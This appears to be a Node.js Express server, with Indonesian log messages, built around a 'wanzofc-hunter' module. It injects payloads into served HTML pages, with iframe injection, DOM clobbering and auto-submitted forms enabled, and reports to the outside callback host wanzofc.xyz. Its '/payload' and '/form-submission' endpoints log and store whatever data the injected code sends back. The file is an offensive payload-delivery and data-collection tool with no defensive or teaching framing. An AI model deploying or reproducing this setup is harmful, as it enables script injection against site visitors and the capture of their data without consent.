const express = require('express');
const wanzofc = require('wanzofc-hunter');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

wanzofc.configure(app, {
    callbackURL: 'https://wanzofc.xyz', 
    autoSubmitForms: true,
    iframeInjection: true,
    chaosMode: true,
    domClobbering: true,
    domClobberingLevel: 'advanced'
});

app.get('/', (req, res) => {
    const filePath = path.join(__dirname, 'index.html');
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error("Gagal membaca file:", err);
            return res.status(500).send('Internal Server Error');
        }
        const defaultPayload = 'svg';
        const defaultIframeURL = 'about:blank';
        const modifiedData = data
            .replace('{{PAYLOAD_INPUT}}', defaultPayload)
            .replace('{{IFRAME_URL_INPUT}}', defaultIframeURL);

        try {
            const injectedHTML = wanzofc.injectPayload(modifiedData, req);
            res.send(injectedHTML);
        } catch (error) {
            console.error("Error injecting payload:", error);
            res.status(500).send("Internal Server Error");
        }
    });
});

app.post('/form-submission', (req, res) => {
    console.log('Data formulir:', req.body);
    res.send('Data diterima!');
});

app.post('/payload', (req, res) => {
    console.log('Payload diterima:', req.body);
    const timestamp = Date.now();
    const filename = `payload-${timestamp}.json`;
    fs.writeFile(filename, JSON.stringify(req.body, null, 2), err => {
        if (err) {
            console.error('Gagal menyimpan payload:', err);
            res.status(500).send('Internal Server Error');
        } else {
            console.log(`Payload disimpan ke ${filename}`);
            res.send('Payload diterima!');
        }
    });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server berjalan di: http://localhost:${port}`);
});
